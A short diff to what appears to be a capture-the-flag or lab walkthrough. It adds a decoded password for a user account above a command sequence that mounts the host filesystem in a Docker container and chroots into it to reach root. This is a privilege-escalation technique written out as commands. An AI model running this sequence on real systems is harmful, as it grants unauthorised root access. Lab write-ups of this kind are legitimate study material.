@@ -113,9 +113,7 @@ echo -n IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d ; echo
 
 ```commandline
 su - anorodh
-
-
-
+# Password: !d0ntKn0wmYp@ssw0rd
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 id
 cd /root
